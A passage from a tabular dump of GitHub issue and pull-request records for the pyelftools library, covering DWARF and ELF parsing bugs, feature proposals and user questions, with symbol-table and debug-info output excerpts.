lpe = lp.get_entries()[0]
filename = lp.entry_filename(lpe)
```

Thoughts? I'd be happy to contribute this feature.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/283/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/283/comments,https://api.github.com/repos/eliben/pyelftools/issues/283/events,https://github.com/eliben/pyelftools/issues/283,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/282,561254734,MDExOlB1bGxSZXF1ZXN0MzcyMDk5NTYy,282,Add support for DW_LNE_set_discriminator ,3059210,closed,FALSE,3059210,NA,10,2020-02-06T20:34:43Z,2020-03-23T20:47:10Z,2020-03-21T14:29:46Z,CONTRIBUTOR,NA,"Adds `DW_LNE_set_discriminator` support to the LNP state machine. Also adds the relevant constant and two `lo`/`hi` constants in the LNE family.

Ref DWARFv4:
* 6.2.2 State Machine Registers
* 6.2.5.2 Standard Opcodes
* 6.2.5.3 Extended Opcodes",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/282/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/282/comments,https://api.github.com/repos/eliben/pyelftools/issues/282/events,https://github.com/eliben/pyelftools/pull/282,https://api.github.com/repos/eliben/pyelftools/pulls/282
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/281,561166634,MDU6SXNzdWU1NjExNjY2MzQ=,281,Is DW_AT_ranges giving correct result?,60751294,open,FALSE,NA,NA,7,2020-02-06T17:40:34Z,2020-02-07T13:39:53Z,NA,NONE,NA,"Not sure if this is pyelftools question or general DWARF question.

I ran a slightly modified version of dwarf_range_lists.py from examples and got the following:

```
Found a compile unit at offset 99406553, length 9832
---------------------------- START TOP DIE -------------------------
DIE DW_TAG_compile_unit, size=35, has_children=True
    |DW_AT_comp_dir    :  AttributeValue(name='DW_AT_comp_dir', form='DW_FORM_strp', value=b'directory/path', raw_value=7867314, offset=99406565)
    |DW_AT_name        :  AttributeValue(name='DW_AT_name', form='DW_FORM_strp', value=b'file.C', raw_value=8080662, offset=99406569)
    |DW_AT_producer    :  AttributeValue(name='DW_AT_producer', form='DW_FORM_strp', value=b'Intel(R) C++ Intel(R) 64 Compiler for applications running on Intel(R) 64, Version 16.0.0.109 Build 20150815\n Opt_report_file Linux_AMD64/file.opt', raw_value=8080780, offset=99406573)
    |DW_AT_language    :  AttributeValue(name='DW_AT_language', form='DW_FORM_data1', value=4, raw_value=4, offset=99406581)
    |DW_AT_use_UTF8    :  AttributeValue(name='DW_AT_use_UTF8', form='DW_FORM_flag', value=True, raw_value=1, offset=99406582)
    |DW_AT_low_pc      :  AttributeValue(name='DW_AT_low_pc', form='DW_FORM_addr', value=0, raw_value=0, offset=99406583)
    |DW_AT_ranges      :  AttributeValue(name='DW_AT_ranges', form='DW_FORM_data4', value=2131408, raw_value=2131408, offset=99406591)
    |DW_AT_stmt_list   :  AttributeValue(name='DW_AT_stmt_list', form='DW_FORM_data4', value=17619546, raw_value=17619546, offset=99406595)

----------------------------END OF TOP DIE-------------------------
   DIE DW_TAG_compile_unit at 99406564. attr DW_AT_ranges.
[RangeEntry(begin_offset=21905584, end_offset=21905792), RangeEntry(begin_offset=21905792, end_offset=21906112), RangeEntry(begin_offset=22503872, end_offset=22505168)]
   DIE DW_TAG_inlined_subroutine at 99406846. attr DW_AT_ranges.
[RangeEntry(begin_offset=22504548, end_offset=22504573), RangeEntry(begin_offset=22504581, end_offset=22504609), RangeEntry(begin_offset=22504629, end_offset=22504635), RangeEntry(begin_offset=22504643, end_offset=22504683), RangeEntry(begin_offset=22504732, end_offset=22504820), RangeEntry(begin_offset=22505009, end_offset=22505075)]
   DIE DW_TAG_inlined_subroutine at 99406868. attr DW_AT_ranges.
[RangeEntry(begin_offset=22504548, end_offset=22504573), RangeEntry(begin_offset=22504581, end_offset=22504609), RangeEntry(begin_offset=22504629, end_offset=22504635), RangeEntry(begin_offset=22504643, end_offset=22504649), RangeEntry(begin_offset=22504774, end_offset=22504820), RangeEntry(begin_offset=22505009, end_offset=22505075)]
   DIE DW_TAG_inlined_subroutine at 99407098. attr DW_AT_ranges.
[RangeEntry(begin_offset=22504376, end_offset=22504438), RangeEntry(begin_offset=22504450, end_offset=22504456), RangeEntry(begin_offset=22504490, end_offset=22504495), RangeEntry(begin_offset=22504836, end_offset=22505009)]
   DIE DW_TAG_inlined_subroutine at 99407144. attr DW_AT_ranges.
[RangeEntry(begin_offset=22504408, end_offset=22504421), RangeEntry(begin_offset=22504436, end_offset=22504438), RangeEntry(begin_offset=22504450, end_offset=22504456)]
   DIE DW_TAG_inlined_subroutine at 99407342. attr DW_AT_ranges.
[RangeEntry(begin_offset=22504146, end_offset=22504151), RangeEntry(begin_offset=22504154, end_offset=22504165)]
   DIE DW_TAG_inlined_subroutine at 99407366. attr DW_AT_ranges.
[RangeEntry(begin_offset=22504146, end_offset=22504151), RangeEntry(begin_offset=22504154, end_offset=22504160)]
   DIE DW_TAG_inlined_subroutine at 99407413. attr DW_AT_ranges.
[RangeEntry(begin_offset=22504146, end_offset=22504151), RangeEntry(begin_offset=22504154, end_offset=22504156)]
   DIE DW_TAG_inlined_subroutine at 99414511. attr DW_AT_ranges.
[BaseAddressEntry(base_address=21905792), RangeEntry(begin_offset=21905803, end_offset=21905901), RangeEntry(begin_offset=21905943, end_offset=21905986), RangeEntry(begin_offset=21906028, end_offset=21906112)]
```

I believe to get code address I would get cu_offset + begin_offset for any RangeEntry with no BaseAddressEntry.

However, if there is a BaseAddressEntry, am I supposed to add BaseAddressEntry address to every RangeEntry begin_offset in the list? I would assume so due to the following line from DWARF docs v3, specifically point 2:

```
A base address selection entry consists of:
1. The value of the largest representable address offset (for example, 0xffffffff when the size of
an address is 32 bits).
2. An address, which defines the appropriate base address for use in interpreting the beginning
and ending address offsets of subsequent entries of the location list. 
```
However looking at the values, it appears that the base address entry and subsequent range lists entries are not set up this way. They appear to be absolute addresses from the CU. Is this intended or am I misunderstanding something here? If so, what is the point of the BaseAddressEntry?

",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/281/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/281/comments,https://api.github.com/repos/eliben/pyelftools/issues/281/events,https://github.com/eliben/pyelftools/issues/281,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/280,561126230,MDU6SXNzdWU1NjExMjYyMzA=,280,Get memory address of C++ class members,32884309,open,FALSE,NA,NA,7,2020-02-06T16:28:59Z,2021-03-27T00:30:40Z,NA,NONE,NA,"Hi,
currently I'm playing around with the elftools and try to get some addresses out of my elf.
Can you give an example how to parse out the addresses of class members?

I created a little demo application:

`class TestClass {
public:
  int a = 5;
  int b = 11;

int add() {
  return a+b;
}

};

TestClass tester;

int main() {  
  tester.add();
  return 0;
}`

When I compile the programm and read out the symbols with the ElfReader, I get the following results:

`Symbol table '.symtab' contains 146 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00008000     0 SECTION LOCAL  DEFAULT    1
     2: 00008018     0 SECTION LOCAL  DEFAULT    2
     3: 00008670     0 SECTION LOCAL  DEFAULT    3
     4: 00008688     0 SECTION LOCAL  DEFAULT    4
     5: 0000868c     0 SECTION LOCAL  DEFAULT    5
     6: 00008694     0 SECTION LOCAL  DEFAULT    6
     7: 00018698     0 SECTION LOCAL  DEFAULT    7
     8: 000186a0     0 SECTION LOCAL  DEFAULT    8
     9: 000186a8     0 SECTION LOCAL  DEFAULT    9
    10: 00018ae4     0 SECTION LOCAL  DEFAULT   10
    11: 00000000     0 SECTION LOCAL  DEFAULT   11
    12: 00000000     0 SECTION LOCAL  DEFAULT   12
    13: 00000000     0 SECTION LOCAL  DEFAULT   13
    14: 00000000     0 FILE    LOCAL  DEFAULT  ABS c:/.conan/7dcb71/1/bin/../lib/gcc/arm-none-eabi/8.3.1/crti.o
    15: 00008000     0 NOTYPE  LOCAL  DEFAULT    1 $a
    16: 00008670     0 NOTYPE  LOCAL  DEFAULT    3 $a
    17: 00000000     0 FILE    LOCAL  DEFAULT  ABS c:/.conan/7dcb71/1/bin/../lib/gcc/arm-none-eabi/8.3.1/crtn.o
    18: 0000800c     0 NOTYPE  LOCAL  DEFAULT    1 $a
    19: 0000867c     0 NOTYPE  LOCAL  DEFAULT    3 $a
    20: 00000000     0 FILE    LOCAL  DEFAULT  ABS exit.c
    21: 00008018     0 NOTYPE  LOCAL  DEFAULT    2 $a
    22: 00008048     0 NOTYPE  LOCAL  DEFAULT    2 $d
    23: 00000000     0 FILE    LOCAL  DEFAULT  ABS __call_atexit.c
    24: 0000804c     0 NOTYPE  LOCAL  DEFAULT    2 $a
    25: 0000804c    40 FUNC    LOCAL  DEFAULT    2 register_fini
    26: 0000806c     0 NOTYPE  LOCAL  DEFAULT    2 $d
    27: 00018698     0 NOTYPE  LOCAL  DEFAULT    7 $d
    28: 000083f4     0 NOTYPE  LOCAL  DEFAULT    2 $a
    29: 00008514     0 NOTYPE  LOCAL  DEFAULT    2 $d
    30: 00018ae0     0 NOTYPE  LOCAL  DEFAULT    9 $d
    31: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    32: 00008694     0 OBJECT  LOCAL  DEFAULT    6
    33: 000186a8     0 NOTYPE  LOCAL  DEFAULT    9 $d
    34: 00008074     0 NOTYPE  LOCAL  DEFAULT    2 $a
    35: 00008074     0 FUNC    LOCAL  DEFAULT    2 __do_global_dtors_aux
    36: 000080a8     0 NOTYPE  LOCAL  DEFAULT    2 $d
    37: 00018ae4     1 NOTYPE  LOCAL  DEFAULT   10 completed.8885
    38: 000186a0     0 NOTYPE  LOCAL  DEFAULT    8 $d
    39: 000186a0     0 OBJECT  LOCAL  DEFAULT    8 __do_global_dtors_aux_fini_array_entry
    40: 000080b4     0 NOTYPE  LOCAL  DEFAULT    2 $a
    41: 000080b4     0 FUNC    LOCAL  DEFAULT    2 frame_dummy
    42: 000080d8     0 NOTYPE  LOCAL  DEFAULT    2 $d
    43: 00018ae8    24 NOTYPE  LOCAL  DEFAULT   10 object.8890
    44: 0001869c     0 NOTYPE  LOCAL  DEFAULT    7 $d
    45: 0001869c     0 OBJECT  LOCAL  DEFAULT    7 __frame_dummy_init_array_entry
    46: 00018ae4     0 NOTYPE  LOCAL  DEFAULT   10 $d
    47: 00000000     0 FILE    LOCAL  DEFAULT  ABS c:/.conan/7dcb71/1/bin/../lib/gcc/arm-none-eabi/8.3.1/../../../../arm-none-eabi/lib/crt0.o
    48: 000080e4     0 NOTYPE  LOCAL  DEFAULT    2 $a
    49: 000081d8     0 NOTYPE  LOCAL  DEFAULT    2 $d
    50: 0000868c     0 NOTYPE  LOCAL  DEFAULT    5 $d
    51: 00000000     0 FILE    LOCAL  DEFAULT  ABS TestClass.cpp
    52: 00008220     0 NOTYPE  LOCAL  DEFAULT    2 $a
    53: 00008694     0 NOTYPE  LOCAL  DEFAULT    5 $d
    54: 000186ac     0 NOTYPE  LOCAL  DEFAULT    9 $d
    55: 000081f8     0 NOTYPE  LOCAL  DEFAULT    2 $a
    56: 0000821c     0 NOTYPE  LOCAL  DEFAULT    2 $d
    57: 00008694     0 NOTYPE  LOCAL  DEFAULT    5 $d
    58: 00000000     0 FILE    LOCAL  DEFAULT  ABS impure.c
    59: 000186b4     0 NOTYPE  LOCAL  DEFAULT    9 $d
    60: 000186b8  1064 OBJECT  LOCAL  DEFAULT    9 impure_data
    61: 000186b8     0 NOTYPE  LOCAL  DEFAULT    9 $d
    62: 00008688     0 NOTYPE  LOCAL  DEFAULT    4 $d
    63: 00000000     0 FILE    LOCAL  DEFAULT  ABS init.c
    64: 00008254     0 NOTYPE  LOCAL  DEFAULT    2 $a
    65: 000082cc     0 NOTYPE  LOCAL  DEFAULT    2 $d
    66: 00000000     0 FILE    LOCAL  DEFAULT  ABS memset.c
    67: 000082dc     0 NOTYPE  LOCAL  DEFAULT    2 $a
    68: 00000000     0 FILE    LOCAL  DEFAULT  ABS atexit.c
    69: 0000851c     0 NOTYPE  LOCAL  DEFAULT    2 $a
    70: 00000000     0 FILE    LOCAL  DEFAULT  ABS fini.c
    71: 0000853c     0 NOTYPE  LOCAL  DEFAULT    2 $a
    72: 0000857c     0 NOTYPE  LOCAL  DEFAULT    2 $d
    73: 00000000     0 FILE    LOCAL  DEFAULT  ABS lock.c
    74: 00008584     0 NOTYPE  LOCAL  DEFAULT    2 $a
    75: 00008588     0 NOTYPE  LOCAL  DEFAULT    2 $a
    76: 0000858c     0 NOTYPE  LOCAL  DEFAULT    2 $a
    77: 00008590     0 NOTYPE  LOCAL  DEFAULT    2 $a
    78: 00008594     0 NOTYPE  LOCAL  DEFAULT    2 $a
    79: 00008598     0 NOTYPE  LOCAL  DEFAULT    2 $a
    80: 0000859c     0 NOTYPE  LOCAL  DEFAULT    2 $a
    81: 000085a4     0 NOTYPE  LOCAL  DEFAULT    2 $a
    82: 000085ac     0 NOTYPE  LOCAL  DEFAULT    2 $a
    83: 000085b0     0 NOTYPE  LOCAL  DEFAULT    2 $a
    84: 00000000     0 FILE    LOCAL  DEFAULT  ABS __atexit.c
    85: 000085b4     0 NOTYPE  LOCAL  DEFAULT    2 $a
    86: 00008664     0 NOTYPE  LOCAL  DEFAULT    2 $d
    87: 00000000     0 FILE    LOCAL  DEFAULT  ABS _exit.c
    88: 0000866c     0 NOTYPE  LOCAL  DEFAULT    2 $a
    89: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    90: 00008694     0 NOTYPE  LOCAL  DEFAULT    6 $d
    91: 00008694     0 OBJECT  LOCAL  DEFAULT    6 __FRAME_END__
    92: 00000000     0 FILE    LOCAL  DEFAULT  ABS
    93: 000186a4     0 NOTYPE  LOCAL  DEFAULT    8 __fini_array_end
    94: 000186a0     0 NOTYPE  LOCAL  DEFAULT    8 __fini_array_start
    95: 000186a0     0 NOTYPE  LOCAL  DEFAULT    7 __init_array_end
    96: 00018698     0 NOTYPE  LOCAL  DEFAULT    7 __preinit_array_end
    97: 00018698     0 NOTYPE  LOCAL  DEFAULT    7 __init_array_start
    98: 00018698     0 NOTYPE  LOCAL  DEFAULT    7 __preinit_array_start
    99: 00008220    52 FUNC    WEAK   DEFAULT    2 _ZN9TestClass3addEv
   100: 00018b00     1 OBJECT  GLOBAL DEFAULT   10 __lock___atexit_recursive_mutex
   101: 00018b04     1 OBJECT  GLOBAL DEFAULT   10 __lock___arc4random_mutex
   102: 00018ae0     4 OBJECT  GLOBAL DEFAULT    9 __atexit_recursive_mutex
   103: 0000858c     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_close
   104: 00018b24     0 NOTYPE  GLOBAL DEFAULT   10 _bss_end__
   105: 00018ae4     0 NOTYPE  GLOBAL DEFAULT   10 __bss_start__
   106: 000186a8     0 OBJECT  GLOBAL HIDDEN     9 __dso_handle
   **107: 000186ac     8 OBJECT  GLOBAL DEFAULT    9 tester**
   108: 00018b08     1 OBJECT  GLOBAL DEFAULT   10 __lock___env_recursive_mutex
   109: 00018b0c     1 OBJECT  GLOBAL DEFAULT   10 __lock___sinit_recursive_mutex
   110: 00008688     4 OBJECT  GLOBAL DEFAULT    4 _global_impure_ptr
   111: 00008254   136 FUNC    GLOBAL DEFAULT    2 __libc_init_array
   112: 000080e4     0 NOTYPE  GLOBAL DEFAULT    2 _mainCRTStartup
   113: 00008000     0 FUNC    GLOBAL DEFAULT    1 _init
   114: 0000853c    72 FUNC    GLOBAL DEFAULT    2 __libc_fini_array
   115: 00018b10     1 OBJECT  GLOBAL DEFAULT   10 __lock___malloc_recursive_mutex
   116: 000085b0     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_release_recursive
   117: 000085a4     8 FUNC    GLOBAL DEFAULT    2 __retarget_lock_try_acquire_recursive
   118: 00018b24     0 NOTYPE  GLOBAL DEFAULT   10 __bss_end__
   119: 000083f4   296 FUNC    GLOBAL DEFAULT    2 __call_exitprocs
   120: 000080e4     0 NOTYPE  GLOBAL DEFAULT    2 _start
   121: 0000859c     8 FUNC    GLOBAL DEFAULT    2 __retarget_lock_try_acquire
   122: 000085b4   184 FUNC    GLOBAL DEFAULT    2 __register_exitproc
   123: 00008590     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_close_recursive
   124: 00008598     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_acquire_recursive
   125: 00018ae4     0 NOTYPE  GLOBAL DEFAULT   10 __bss_start
   126: 000082dc   280 FUNC    GLOBAL DEFAULT    2 memset
   127: 000081f8    40 FUNC    GLOBAL DEFAULT    2 main
   128: 00008588     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_init_recursive
   129: 00018b24     0 NOTYPE  GLOBAL DEFAULT   10 __end__
   130: 00008584     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_init
   131: 00008670     0 FUNC    GLOBAL DEFAULT    3 _fini
   132: 0000851c    32 FUNC    GLOBAL DEFAULT    2 atexit
   133: 000186b4     4 OBJECT  GLOBAL DEFAULT    9 _impure_ptr
   134: 00018ae4     0 NOTYPE  GLOBAL DEFAULT    9 _edata
   135: 00018b24     0 NOTYPE  GLOBAL DEFAULT   10 _end
   136: 00018b14     1 OBJECT  GLOBAL DEFAULT   10 __lock___at_quick_exit_mutex
   137: 00008018    52 FUNC    GLOBAL DEFAULT    2 exit
   138: 00008594     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_acquire
   139: 000085ac     4 FUNC    GLOBAL DEFAULT    2 __retarget_lock_release
   140: 0000866c     4 FUNC    GLOBAL DEFAULT    2 _exit
   141: 00018b18     1 OBJECT  GLOBAL DEFAULT   10 __lock___dd_hash_mutex
   142: 00018b1c     1 OBJECT  GLOBAL DEFAULT   10 __lock___tz_mutex
   143: 00080000     0 NOTYPE  GLOBAL DEFAULT   11 _stack
   144: 000186a8     0 NOTYPE  GLOBAL DEFAULT    9 __data_start
   145: 00018b20     1 OBJECT  GLOBAL DEFAULT   10 __lock___sfp_recursive_mutex
`
I can see the global tester object with its address. But can I also get the addresses for the class members a and b?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/280/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/280/comments,https://api.github.com/repos/eliben/pyelftools/issues/280/events,https://github.com/eliben/pyelftools/issues/280,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/279,561124291,MDU6SXNzdWU1NjExMjQyOTE=,279,Shouldn't DW_FORM_strp values be strings?,5807738,open,FALSE,NA,NA,1,2020-02-06T16:25:56Z,2020-03-07T15:03:52Z,NA,CONTRIBUTOR,NA,"On Python3, it's `bytes`.

Also filenames in the lineprogram header.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/279/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/279/comments,https://api.github.com/repos/eliben/pyelftools/issues/279/events,https://github.com/eliben/pyelftools/issues/279,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/278,560903746,MDU6SXNzdWU1NjA5MDM3NDY=,278,Missing import,24232293,closed,FALSE,NA,NA,2,2020-02-06T10:04:00Z,2020-03-06T14:00:28Z,2020-03-06T14:00:28Z,NONE,NA,"In construct_utils.py, missing import of **SizeofError**:
`from ..construct import (
    Subconstruct, ConstructError, ArrayError, Adapter, Field, RepeatUntil,
    Rename, SizeofError
    )
`",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/278/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/278/comments,https://api.github.com/repos/eliben/pyelftools/issues/278/events,https://github.com/eliben/pyelftools/issues/278,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/277,560609321,MDExOlB1bGxSZXF1ZXN0MzcxNTY5MTAz,277,"DW_AT_const_value is not a location, take 2",5807738,closed,FALSE,NA,NA,0,2020-02-05T20:25:47Z,2020-03-22T17:02:07Z,2020-03-07T14:05:02Z,CONTRIBUTOR,NA,Crude fix for #274.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/277/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/277/comments,https://api.github.com/repos/eliben/pyelftools/issues/277/events,https://github.com/eliben/pyelftools/pull/277,https://api.github.com/repos/eliben/pyelftools/pulls/277
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/276,560000490,MDExOlB1bGxSZXF1ZXN0MzcxMDY4NjI1,276,DW_AT_const_value of form data4/8 is not a location,5807738,closed,FALSE,NA,NA,1,2020-02-04T21:51:45Z,2020-02-08T01:01:13Z,2020-02-05T20:17:07Z,CONTRIBUTOR,NA,Crude fix for #274.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/276/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/276/comments,https://api.github.com/repos/eliben/pyelftools/issues/276/events,https://github.com/eliben/pyelftools/pull/276,https://api.github.com/repos/eliben/pyelftools/pulls/276
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/275,559630870,MDExOlB1bGxSZXF1ZXN0MzcwNzYzNDU4,275,segments.py: fix TLS checks in section_in_segment(),6428272,closed,FALSE,NA,NA,0,2020-02-04T10:39:27Z,2020-02-04T13:30:10Z,2020-02-04T13:30:10Z,CONTRIBUTOR,NA,"While the comment in section_in_segment() suggests that the
logic follows the logic inside ELF_SECTION_IN_SEGMENT_1 with
the strict parameter set, all of the checks in the binutils
macro are written so that they must succeed for the section
to be contained in the current segment. In our implementation,
however, the checks were not properly negated.

This showed in the case of .tdata and .tbss which did not
appear in the section to segment mapping (these sections are
found in glibc, for example).

Fix it up by aligning the logic more closely to the binutils
macro by implementing the same logic and returning False only
if the checks fail. Additionally, introduce the third check
from the upstream binutils which checks the combination of
SHT_ALLOC sections and PT_LOAD-like segments.

Furthermore, in the original check, the PT_GNU_RELRO type was
misspelled with a 0 (zero) instead of an O so this check
could never have worked.

Fixes: #263",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/275/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/275/comments,https://api.github.com/repos/eliben/pyelftools/issues/275/events,https://github.com/eliben/pyelftools/pull/275,https://api.github.com/repos/eliben/pyelftools/pulls/275
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/274,559285724,MDU6SXNzdWU1NTkyODU3MjQ=,274,False positive on LocationParser.attribute_has_location,5807738,closed,FALSE,NA,NA,4,2020-02-03T19:29:46Z,2020-03-07T14:05:03Z,2020-03-07T14:05:03Z,CONTRIBUTOR,NA,"LocationParser.attribute_has_location() returning `True` doesn't guarantee that the attribute has a location that can be parsed with LocationParser. I'm currently looking at a v2 file from Android NDK with the following DIE:

>  <2><a73e>: Abbrev Number: 75 (DW_TAG_member)
>     <a73f>   DW_AT_name        : (indirect string, offset: 0x394c): FL_FOO
>     <a743>   DW_AT_decl_file   : 23
>     <a744>   DW_AT_decl_line   : 22
>     <a745>   DW_AT_type        : <0x5256>
>     <a749>   DW_AT_external    : 1
>     <a74a>   DW_AT_declaration : 1
>     <a74b>   **DW_AT_const_value (DW_FORM_data4) : 0x40000000**
> 

`attribute_has_location()` returns `true` for the `DW_AT_const_value` attribute. It's clearly not a location pointer.

The parent of that goes:

>  <1><a720>: Abbrev Number: 3 (DW_TAG_structure_type)
>     <a721>   DW_AT_name        : (indirect string, offset: 0x34f0): CMyClass
>     <a725>   DW_AT_byte_size   : 40
>     <a726>   DW_AT_decl_file   : 23
>     <a727>   DW_AT_decl_line   : 17
>     <a728>   DW_AT_sibling     : <0xa7b5>

The corresponding code item in a C++ source is a class level static const int:

struct CMyClass
{
    static const int FL_FOO = 0x40000000;
}

0x4 is clearly not a location code. Maybe some careful parsing of the spec is in order?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/274/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/274/comments,https://api.github.com/repos/eliben/pyelftools/issues/274/events,https://github.com/eliben/pyelftools/issues/274,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/273,558372253,MDExOlB1bGxSZXF1ZXN0MzY5NzcwNzA4,273,ref_addr size changed between v2 and v3 - take 2,5807738,closed,FALSE,NA,NA,8,2020-01-31T21:05:24Z,2020-03-22T17:02:10Z,2020-03-07T13:34:29Z,CONTRIBUTOR,NA,"In DWARF 2, the DW_FORM_ref_addr format matches the target address size, while in DWARF3+ it matches the bitness of the CU record. Here are the relevant fragments from the spec, part 7:

v2:

> The second type of reference is the address of any debugging information entry within the same executable or shared object; it may refer to an entry in a different compilation unit from the unit containing the reference. This type of reference (DW_FORM_ref_addr) **is the size of an address on the target architecture**; it is relocatable in a relocatable object file and relocated in an executable file or shared object. 

v3:

> The second type of reference can identify any debugging information entry within a program; in particular, it may refer to an entry in a different compilation unit from the unit containing the reference, and may refer to an entry in a different shared object. This type of reference (DW_FORM_ref_addr) is an offset from the beginning of the .debug_info section of the target executable or shared object; it is relocatable in a relocatable object file and frequently relocated in an executable file or shared object. For references from one shared object or static executable file to another, the relocation and identification of the target object must be performed by the consumer. **In the 32-bit DWARF format, this offset is a 4-byte unsigned value; in the 64-bit DWARF format, it is an 8-byte unsigned value** (see Section 7.4).

If `elftools` encounters 32-bit DWARF v2 targeting a 64-bit architecture, it will misparse DW_FORM_ref_addr and crash downstream.

I encountered this in an iOS binary from 2017, built with Xcode several versions ago for ARM64. This probably never came up before because by the time 64 bit code became relevant, most toolchains would generate DWARF 3 or newer.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/273/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/273/comments,https://api.github.com/repos/eliben/pyelftools/issues/273/events,https://github.com/eliben/pyelftools/pull/273,https://api.github.com/repos/eliben/pyelftools/pulls/273
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/272,558332479,MDExOlB1bGxSZXF1ZXN0MzY5NzQwNjEw,272,ref_addr size changed between v2 and v3,5807738,closed,FALSE,NA,NA,1,2020-01-31T19:39:06Z,2020-01-31T20:53:05Z,2020-01-31T20:52:38Z,CONTRIBUTOR,NA,"In DWARF 2, the DW_FORM_ref_addr format matches the target address size, while in DWARF3+ it matches the bitness of the CU record. Here are the relevant fragments from the spec, part 7:

v2:

> The second type of reference is the address of any debugging information entry within the same executable or shared object; it may refer to an entry in a different compilation unit from the unit containing the reference. This type of reference (DW_FORM_ref_addr) **is the size of an address on the target architecture**; it is relocatable in a relocatable object file and relocated in an executable file or shared object. 

v3:

> The second type of reference can identify any debugging information entry within a program; in particular, it may refer to an entry in a different compilation unit from the unit containing the reference, and may refer to an entry in a different shared object. This type of reference (DW_FORM_ref_addr) is an offset from the beginning of the .debug_info section of the target executable or shared object; it is relocatable in a relocatable object file and frequently relocated in an executable file or shared object. For references from one shared object or static executable file to another, the relocation and identification of the target object must be performed by the consumer. **In the 32-bit DWARF format, this offset is a 4-byte unsigned value; in the 64-bit DWARF format, it is an 8-byte unsigned value** (see Section 7.4).

If `elftools` encounters 32-bit DWARF v2 targeting a 64-bit architecture, it will misparse DW_FORM_ref_addr and crash downstream.

I encountered this in an iOS binary from 2017, built with Xcode several versions ago for ARM64. This probably never came up before because by the time 64 bit code became relevant, most toolchains would generate DWARF 3 or newer.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/272/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/272/comments,https://api.github.com/repos/eliben/pyelftools/issues/272/events,https://github.com/eliben/pyelftools/pull/272,https://api.github.com/repos/eliben/pyelftools/pulls/272
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/271,558305441,MDExOlB1bGxSZXF1ZXN0MzY5NzIwMTY0,271,DWARF 5 tags and attributes,5807738,closed,FALSE,NA,NA,0,2020-01-31T18:42:14Z,2020-03-22T17:02:18Z,2020-02-04T13:37:05Z,CONTRIBUTOR,NA,"Xcode puts those tags and attributes in CUs where the nominal version number is 4. DWARF 5 is coming anyway, might as well respect.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/271/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/271/comments,https://api.github.com/repos/eliben/pyelftools/issues/271/events,https://github.com/eliben/pyelftools/pull/271,https://api.github.com/repos/eliben/pyelftools/pulls/271
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/270,557033674,MDU6SXNzdWU1NTcwMzM2NzQ=,270,Change relocate_dwarf_sections default value,662616,closed,FALSE,NA,NA,1,2020-01-29T18:17:44Z,2020-02-04T14:26:00Z,2020-02-04T14:25:59Z,CONTRIBUTOR,NA,"My linux kernel debug info (Fedora 31, 5.4.13-201.fc31.x86_64) must not
be relocated, since its `e_type` is `ET_EXEC`, not `ET_REL`. Despite
that and for whatever reason, the relocation section for `.debug_info`
is present and contains completely bogus information.

Because of that, when using `get_dwarf_info()` I get e.g. incorrect
symbol names. As a workaround I now use
`get_dwarf_info(relocate_dwarf_sections=False)`, but it would be great
if default functioned correctly.

So I propose to change the default `relocate_dwarf_sections` value from
`True` to `None`, where `None` would mean ""autodetect based on `e_type`
value"".

